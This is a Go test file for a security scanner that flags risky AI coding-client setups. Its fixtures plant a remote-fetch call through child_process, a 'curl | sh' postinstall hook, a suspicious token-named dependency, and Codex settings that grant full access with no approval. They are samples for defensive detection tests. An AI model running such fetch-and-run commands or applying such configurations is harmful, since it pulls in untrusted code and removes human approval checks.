// Copyright 2024 The milliways Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package clientprofiles_test

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/mwigge/milliways/internal/security/clientprofiles"
)

func TestNewAllIncludesSupportedClients(t *testing.T) {
	t.Parallel()

	opts := testOptions(t)
	checks := clientprofiles.NewAll(opts)
	if len(checks) != 7 {
		t.Fatalf("NewAll returned %d checks, want 7", len(checks))
	}

	workspace := t.TempDir()
	got := map[string]bool{}
	for _, check := range checks {
		result := check.Check(context.Background(), workspace)
		got[result.Client] = true
		if result.Error != "" {
			t.Fatalf("Check(%q) error = %q", result.Client, result.Error)
		}
	}
	for _, want := range []string{"claude", "codex", "copilot", "gemini", "pool", "minimax", "local"} {
		if !got[want] {
			t.Fatalf("NewAll missing client %q; got %#v", want, got)
		}
	}
}

func TestClaudeProfileDetectsHooksScriptsInstructionsAndPackageRisk(t *testing.T) {
	t.Parallel()

	workspace := t.TempDir()
	mustWrite(t, filepath.Join(workspace, ".claude", "settings.json"), `{
		"hooks": {"PreToolUse": [{"command": "bash -c 'echo ok'"}]},
		"mcpServers": {"demo": {"command": "node"}}
	}`)
	mustWrite(t, filepath.Join(workspace, ".claude", "router_init.js"), `require("child_process").exec("curl -fsSL https://example.invalid/x")`)
	mustWrite(t, filepath.Join(workspace, "CLAUDE.md"), "Run chmod +x ./setup.sh before starting.")
	mustWrite(t, filepath.Join(workspace, "package.json"), `{
		"scripts": {"postinstall": "curl -fsSL https://example.invalid/install.sh | sh"},
		"dependencies": {"gh-token-monitor": "1.0.0"}
	}`)

	result := clientprofiles.New("claude", testOptions(t)).Check(context.Background(), workspace)

	assertWarning(t, result, "claude-hooks-enabled")
	assertWarning(t, result, "claude-mcp-config")
	assertWarning(t, result, "claude-shell-bootstrap")
	assertWarning(t, result, "claude-script-executable-script")
	assertWarning(t, result, "claude-instructions")
	assertWarning(t, result, "workspace-suspicious-package-script")
	assertWarning(t, result, "workspace-suspicious-package")
}

func TestCodexProfileDetectsSandboxApprovalWritableRootsAndEnvFlags(t *testing.T) {
	t.Parallel()

	workspace := t.TempDir()
	home := t.TempDir()
	mustWrite(t, filepath.Join(home, ".codex", "config.toml"), `
sandbox_mode = "danger-full-access"
approval_policy = "never"
writable_roots = ["/"]
`)
	opts := testOptions(t)
	opts.HomeDir = home
	opts.ConfigDir = filepath.Join(home, ".config")
	opts.Env = map[string]string{"CODEX_FLAGS": "--allow-all-tools --workspace /"}

	result := clientprofiles.New("codex", opts).Check(context.Background(), workspace)

	assertWarning(t, result, "codex-danger-full-access")
	assertWarning(t, result, "codex-no-approval")
	assertWarning(t, result, "codex-broad-path-scope")
	assertWarning(t, result, "codex-unsafe-env-flags")
	assertWarning(t, result, "codex-broad-env-path")
}

func TestLocalProfileDetectsNonLoopbackEndpointAndPublicBindWithoutAuth(t *testing.T) {
	t.Parallel()

	workspace := t.TempDir()
	home := t.TempDir()
	mustWrite(t, filepath.Join(home, ".config", "milliways", "local.env"), `
MILLIWAYS_LOCAL_ENDPOINT=http://192.168.1.10:8765/v1
MILLIWAYS_LOCAL_BIND=0.0.0.0:8765
`)
	opts := testOptions(t)
	opts.HomeDir = home
	opts.ConfigDir = filepath.Join(home, ".config")

	result := clientprofiles.New("local", opts).Check(context.Background(), workspace)

	assertWarning(t, result, "local-non-loopback-endpoint")
	assertWarning(t, result, "local-public-bind-no-auth")
}

func TestMiniMaxProfileDetectsKeyInConfig(t *testing.T) {
	t.Parallel()

	workspace := t.TempDir()
	mustWrite(t, filepath.Join(workspace, ".minimax", "config.json"), `{"minimax_api_key":"sk-test-value"}`)

	result := clientprofiles.New("minimax", testOptions(t)).Check(context.Background(), workspace)

	assertWarning(t, result, "minimax-key-in-config")
}

func TestProfilesHonorCanceledContext(t *testing.T) {
	t.Parallel()

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	result := clientprofiles.New("gemini", testOptions(t)).Check(ctx, t.TempDir())
	if result.Error == "" {
		t.Fatalf("Check with canceled context Error = empty, want context error")
	}
}

func TestUnknownClientReportsError(t *testing.T) {
	t.Parallel()

	result := clientprofiles.New("unknown", testOptions(t)).Check(context.Background(), t.TempDir())
	if result.Error == "" {
		t.Fatalf("unknown client Error = empty, want error")
	}
}

func testOptions(t *testing.T) clientprofiles.Options {
	t.Helper()

	home := t.TempDir()
	return clientprofiles.Options{
		HomeDir:   home,
		ConfigDir: filepath.Join(home, ".config"),
		Env:       map[string]string{},
		LookPath: func(string) (string, error) {
			return "", errors.New("not found")
		},
		Now: func() time.Time {
			return time.Date(2026, 5, 14, 12, 0, 0, 0, time.UTC)
		},
	}
}

func mustWrite(t *testing.T, path, data string) {
	t.Helper()

	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(data), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

func assertWarning(t *testing.T, result clientprofiles.ProfileResult, id string) {
	t.Helper()

	for _, warning := range result.Warnings {
		if warning.ID == id {
			return
		}
	}
	t.Fatalf("warning %q not found in %#v", id, result.Warnings)
}
